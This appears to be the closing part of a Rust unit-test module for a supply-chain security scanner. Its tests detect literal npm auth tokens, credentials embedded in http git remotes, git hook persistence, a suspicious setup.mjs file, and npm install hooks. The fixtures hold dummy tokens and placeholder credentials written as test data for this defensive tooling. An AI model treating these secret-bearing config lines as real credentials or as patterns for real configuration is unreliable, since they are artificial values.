        std::fs::write(
            home.path().join(".gitconfig"),
            "[user]\n\tname = Test\n\temail = test@example.com\n",
        )
        .unwrap();

        assert!(scan_git_hook_persistence_at(home.path()).is_empty());
    }

    #[test]
    fn detects_a_literal_auth_token_in_npmrc() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join(".npmrc");
        std::fs::write(
            &path,
            "//registry.npmjs.org/:_authToken=npm_abcdefghijklmnop\nregistry=https://registry.npmjs.org/\n",
        )
        .unwrap();

        let signals = scan_npmrc_secrets_at(&path);
        assert_eq!(signals.len(), 1);
        assert_eq!(signals[0].category, ThreatCategory::ExposedSecret);
    }

    #[test]
    fn ignores_an_env_interpolated_npmrc_token() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join(".npmrc");
        std::fs::write(&path, "//registry.npmjs.org/:_authToken=${NPM_TOKEN}\n").unwrap();

        assert!(scan_npmrc_secrets_at(&path).is_empty());
    }

    #[test]
    fn ignores_an_npmrc_without_auth_keys() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join(".npmrc");
        std::fs::write(&path, "registry=https://registry.npmjs.org/\n").unwrap();

        assert!(scan_npmrc_secrets_at(&path).is_empty());
    }

    #[test]
    fn hunt_deduplicates_signals_shared_by_workspace_root_and_project_root() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("setup.mjs"), "").unwrap();
        let projects = vec![Project {
            root: dir.path().to_path_buf(),
            has_npm_lock: false,
            has_yarn_lock: false,
        }];

        let signals = hunt(dir.path(), &projects);
        assert_eq!(
            signals
                .iter()
                .filter(|s| s.category == ThreatCategory::SuspiciousFile)
                .count(),
            1
        );
    }

    #[test]
    fn inventories_preinstall_and_postinstall_scripts() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"name":"demo","scripts":{"preinstall":"node build.js","test":"jest"}}"#,
        )
        .unwrap();

        let pkg_dir = dir.path().join("node_modules").join("native-thing");
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join("package.json"),
            r#"{"name":"native-thing","scripts":{"postinstall":"node-gyp rebuild"}}"#,
        )
        .unwrap();

        let clean_dir = dir.path().join("node_modules").join("no-scripts");
        std::fs::create_dir_all(&clean_dir).unwrap();
        std::fs::write(clean_dir.join("package.json"), r#"{"name":"no-scripts"}"#).unwrap();

        let scripts = inventory_install_scripts(dir.path());
        assert_eq!(scripts.len(), 2);
        assert!(scripts
            .iter()
            .any(|s| s.hook == InstallHook::Preinstall && s.command == "node build.js"));
        assert!(scripts
            .iter()
            .any(|s| s.hook == InstallHook::Postinstall && s.command == "node-gyp rebuild"));
    }

    #[test]
    fn install_script_inventory_is_empty_when_no_scripts_declared() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("package.json"), r#"{"name":"demo"}"#).unwrap();

        assert!(inventory_install_scripts(dir.path()).is_empty());
    }

    #[test]
    fn detects_exposed_credentials_in_an_http_git_remote() {
        let dir = tempfile::tempdir().unwrap();
        let git_dir = dir.path().join("repo").join(".git");
        std::fs::create_dir_all(&git_dir).unwrap();
        std::fs::write(
            git_dir.join("config"),
            "[core]\n\trepositoryformatversion = 0\n[remote \"origin\"]\n\turl = http://user:secret-token@github.com/foo/bar.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n",
        )
        .unwrap();

        let signals = scan_git_remote_credentials(dir.path());
        assert_eq!(signals.len(), 1);
        assert_eq!(signals[0].category, ThreatCategory::ExposedSecret);
        assert!(!signals[0].detail.contains("secret-token"));
        assert!(signals[0].detail.contains("github.com/foo/bar.git"));
    }

    #[test]
    fn ignores_an_https_git_remote_even_with_credentials() {
        let dir = tempfile::tempdir().unwrap();
        let git_dir = dir.path().join("repo").join(".git");
        std::fs::create_dir_all(&git_dir).unwrap();
        std::fs::write(
            git_dir.join("config"),
            "[remote \"origin\"]\n\turl = https://user:secret-token@github.com/foo/bar.git\n",
        )
        .unwrap();

        assert!(scan_git_remote_credentials(dir.path()).is_empty());
    }

    #[test]
    fn ignores_an_http_git_remote_without_credentials() {
        let dir = tempfile::tempdir().unwrap();
        let git_dir = dir.path().join("repo").join(".git");
        std::fs::create_dir_all(&git_dir).unwrap();
        std::fs::write(
            git_dir.join("config"),
            "[remote \"origin\"]\n\turl = http://github.com/foo/bar.git\n",
        )
        .unwrap();

        assert!(scan_git_remote_credentials(dir.path()).is_empty());
    }

    #[test]
    fn never_descends_into_git_or_node_modules_directories() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join(".git")).unwrap();
        std::fs::write(
            dir.path().join(".git").join("config"),
            "[remote \"origin\"]\n\turl = http://user:pw@example.com/x.git\n",
        )
        .unwrap();
        let ignored_nested_git = dir.path().join("node_modules").join(".git");
        std::fs::create_dir_all(&ignored_nested_git).unwrap();
        std::fs::write(
            ignored_nested_git.join("config"),
            "[remote \"origin\"]\n\turl = http://user:pw@example.com/should-not-be-found.git\n",
        )
        .unwrap();

        let signals = scan_git_remote_credentials(dir.path());
        assert_eq!(signals.len(), 1);
        assert!(signals[0].detail.contains("example.com/x.git"));
    }
}
